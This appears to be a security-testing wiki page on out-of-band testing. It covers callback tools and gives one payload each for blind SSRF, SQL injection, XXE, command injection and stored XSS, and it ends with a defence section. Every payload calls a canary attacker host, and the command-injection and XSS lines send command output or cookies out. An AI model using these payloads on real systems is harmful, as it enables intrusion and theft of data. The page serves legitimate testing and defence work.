---
title: Out-of-band application security testing (OAST)
slug: oast-out-of-band-testing
---

> **TL;DR:** When a bug is "blind" — no error, no diff, no time delay you can trust — force the target to phone home to a server you control. Burp Collaborator, interactsh, requestrepo.com, and DNS canaries turn invisible bugs into a single log line that says "yes."

## What it is
Out-of-band testing confirms vulnerabilities by triggering a DNS, HTTP, SMTP, or LDAP callback from the target to an attacker-controlled oracle. Where in-band testing reads the response, OAST listens on a side channel. It is the only reliable way to prove blind SSRF, blind SQLi (via `xp_dirtree`, `UTL_HTTP`, `LOAD_FILE`, `dns-name` resolvers), blind XXE (external entity to an attacker URL), blind XSS (stored payload firing in a back-office browser), and blind RCE (curl/nslookup from the box). It is also a discovery aid — payload-template a unique subdomain per request and you can correlate which input reached which downstream system.

## Preconditions / where it applies
- The target's egress allows DNS or HTTP to the public internet (most do, even when HTTP is filtered DNS usually leaks)
- You have a domain or a Collaborator-style service that logs interactions
- For blind XSS: stored sink that an authenticated user/admin will eventually render
- For blind XXE: an XML parser with external-entity processing enabled

## Technique
**Tooling.**
- Burp Collaborator (built into Burp Pro) — DNS, HTTP, SMTP; UUID-per-payload; integrated with Repeater/Intruder/Scanner
- interactsh (ProjectDiscovery, self-hostable) — same protocols, CLI-friendly, pipes well into nuclei
- requestrepo.com / webhook.site — quick one-off HTTP/DNS catchers
- Your own: a wildcard `*.oast.you.tld` pointed at a logging resolver (dnslog-style)

**Canary patterns.** Generate a unique subdomain per injection so a callback identifies the exact field:

```python
sub = f"u{user_id}-f{field_hash}.{collab_domain}"
payload = f"http://{sub}/x"
```

**Blind SSRF.**

```http
POST /api/avatar HTTP/1.1
Content-Type: application/json

{"image_url":"http://canary1.abc.oast.fun/"}
```

Watch Collaborator for the HTTP hit. No hit + DNS hit only = the resolver is recursive but the HTTP layer can't egress (still proves DNS exfil possible).

**Blind SQLi (MSSQL).**

```sql
'; EXEC master..xp_dirtree '\\canary2.abc.oast.fun\x'--
```

**Blind XXE.**

```xml
<!DOCTYPE x [<!ENTITY % e SYSTEM "http://canary3.abc.oast.fun/e.dtd">%e;]>
```

The remote DTD can chain to exfil file contents via parameter entities.

**Blind RCE (Linux).**

```bash
;curl http://canary4.abc.oast.fun/$(id|base64)
```

Base64 the output as the path; the DNS or HTTP log carries it back.

**Blind XSS.** Drop a script tag into a stored field that ends up in an admin panel:

```html
"><script src="https://canary5.abc.oast.fun/x.js"></script>
```

The script can callback with `document.location`, `document.cookie`, screenshot via `html2canvas`.

## Detection and defence
- Egress allowlist on app pods — outbound HTTP/DNS only to known suppliers
- Block resolution of arbitrary public DNS from server-side code (use an internal resolver that allowlists)
- Disable external entities in XML parsers (`disable-external-entities`, libxml2 `XML_PARSE_NONET`)
- WAF rules that flag known Collaborator domains (.oastify.com, .interactsh-server, .burpcollaborator.net) — note attackers rotate to custom domains, so this is partial mitigation only
- Alert on outbound DNS to never-before-seen TLDs from production workloads

## References
- [PortSwigger: out-of-band (OAST)](https://portswigger.net/burp/application-security-testing/oast) — Burp Collaborator overview
- [ProjectDiscovery interactsh](https://github.com/projectdiscovery/interactsh) — open-source OAST server
- [PortSwigger: blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) — OAST patterns per DBMS

See also: [[ssrf]], [[api-evasion-techniques]], [[testing-methodology-checklists]].
